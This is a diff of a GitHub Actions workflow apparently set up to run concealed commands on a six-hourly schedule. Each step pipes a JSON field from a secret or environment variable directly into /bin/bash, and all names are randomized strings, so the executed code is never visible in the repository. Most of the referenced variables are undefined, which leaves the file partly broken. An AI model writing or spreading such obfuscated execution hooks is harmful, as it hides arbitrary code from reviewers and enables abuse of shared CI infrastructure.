@@ -1,29 +1,21 @@
 name: homerunstation
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '46 1/6 * * *'
-
-jobs:  # 27008
+    - cron: '17 4/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: homerunstation
         env:
-          a469: ${{ secrets.a469 }}
+          kxss4: ${{ secrets.kxss4 }}
         run: |
-          echo $a469 | jq -r .jzj23626 | /bin/bash
-          echo $inets822 | jq -r .og12 | /bin/bash
-          echo $fqua89 | jq -r .n583 | /bin/bash
-          echo $ody37493 | jq -r .zspsd8553 | /bin/bash
-          echo $syufs3490 | jq -r .mxl8099 | /bin/bash
-          echo $p47967 | jq -r .ndbn615 | /bin/bash
-          echo $iop27463 | jq -r .rmpgw35939 | /bin/bash
-          echo $yp807 | jq -r .dsfz23 | /bin/bash
-          echo $v4 | jq -r .tr153 | /bin/bash
-          echo $w53047 | jq -r .c12032 | /bin/bash
-          echo $l58 | jq -r .vr09 | /bin/bash
+          echo $kxss4 | jq -r .avawc088 | /bin/bash
+          echo $xxmf3 | jq -r .ubkxg148 | /bin/bash
+          echo $m9437 | jq -r .nzzgp67201 | /bin/bash
+          echo $oihjb57 | jq -r .guko689 | /bin/bash
+          echo $kekzx3491 | jq -r .cs1173 | /bin/bash
+          echo $w8 | jq -r .wtcan9 | /bin/bash
 
